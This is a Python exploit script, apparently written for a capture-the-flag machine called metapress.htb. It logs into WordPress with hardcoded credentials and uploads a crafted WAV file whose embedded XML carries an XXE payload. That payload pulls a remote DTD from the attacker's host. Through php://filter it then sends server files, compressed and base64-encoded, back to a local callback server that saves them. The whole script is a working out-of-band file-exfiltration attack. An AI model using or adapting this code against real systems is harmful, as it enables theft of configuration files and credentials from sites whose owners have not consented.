import os
import sys
import requests
from requests_toolbelt.utils import dump
from http.server import BaseHTTPRequestHandler, HTTPServer
import multiprocessing as mp
import time
import re
from urllib.parse import urlparse
from slugify import slugify
import base64
import zlib

# print(dump.dump_all(r).decode('utf8'))

RHOST = 'http://metapress.htb'
LHOST = 'http://10.10.16.5'
LPORT = 9001

PAYLOAD_FILE = 'payload.wav'
XX3_FILE = 'xx3.dtd'
XXE_FILES = 'xxe_files'
LEAKED_FILE_DIR = 'XXE_outfiles'
WP_HEADERS = {'Cookie': 'wordpress_test_cookie=WP Cookie check'}

def create_payload():
    with open(PAYLOAD_FILE, 'w') as payload_file:
        payload_file.write('RIFF,\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM \'' + LHOST + ':' + str(LPORT) + '/xx3.dtd\'>%remote;%init;%trick;]>\x00')
    print('[+] Payload created')

def create_callback_payload(payload):
    with open(XX3_FILE, 'w') as xx3:
        xx3.writelines(['<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=' + payload + '">',
                        '<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM \'' + LHOST + ':' + str(LPORT) + '/' + payload + '/?file=%file;\'>" >'])
    print('[+] Callback payload created')

def create_login_session():
    s = requests.session()
    r = s.get(RHOST)

    # Login
    data = {
      'log': 'manager',
      'pwd': 'partylikearockstar',
      'wp-submit': 'Log In',
      'redirect_to': RHOST + '/wp-admin/',
      'testcookie':1
    }
    r = s.post(RHOST + '/wp-login.php', data=data, headers=WP_HEADERS, verify=False)
    if '<strong>Error</strong>: The password you entered for the username' in r.text:
        sys.exit('[!] Login failed')

    print('[+] Sucessfully logged in')
    return s

def upload_payload(s):
    # Get upload nonce
    r = s.get(RHOST + '/wp-admin/media-new.php', verify=False)
    nonce_search = re.search(r'name="_wpnonce" value="(.*?)" \/>', r.text)
    if not nonce_search:
        sys.exit('[!] wp_nonce not found')

    nonce = nonce_search.group(1)
    print('[+] Nonce retrieved: ' + nonce)

    # Upload file
    data = {
        'name': 'payload.wav',
        'action': 'upload-attachment',
        '_wpnonce': nonce
    }
    wav = {'async-upload': (PAYLOAD_FILE, open(PAYLOAD_FILE, 'rb'))}
    r = s.post(RHOST + '/wp-admin/async-upload.php', data=data, files=wav)
    if r.status_code == 200:
        print('[+] Wav uploaded successfully')
    else:
        print("[-] Failed to receive a response for uploaded! Try again.")

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/' + XX3_FILE:
            print('[+] XX3 file requested')
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            with open(XX3_FILE, 'rb') as xx3:
                self.wfile.write(xx3.read())
        else:
            query = urlparse(self.path).query
            if not query[:5] == 'file=':
                print('[!] Invalid leaked file received')
            file = query[5:]
            filename = slugify(urlparse(self.path).path)
            with open(LEAKED_FILE_DIR + '/' + filename, 'w') as leaked_file:
                leaked_file.write(zlib.decompress(base64.b64decode(file), -zlib.MAX_WBITS).decode('utf-8'))

            print('[+] Leaked file received, saved as {}'.format(filename))

    def log_message(self, format, *args):
        return

def callback_server():
    http = HTTPServer(('', LPORT), Handler)
    http.serve_forever()

if __name__ == '__main__':
    create_payload()
    s = create_login_session()

    server = mp.Process(target=callback_server)
    server.start()

    print('[+] Iterating over payloads\n')
    with open(XXE_FILES, 'r') as f:
        xxe_files = f.readlines()
        for payload in xxe_files:
            payload = payload.strip()
            if not os.path.isfile(LEAKED_FILE_DIR + '/' + slugify(payload)):
                print('[+] Exfiltrating ' + payload)
                create_callback_payload(payload)
                upload_payload(s)
                time.sleep(2)
                print('')

    print('[+] Done')
    server.terminate()
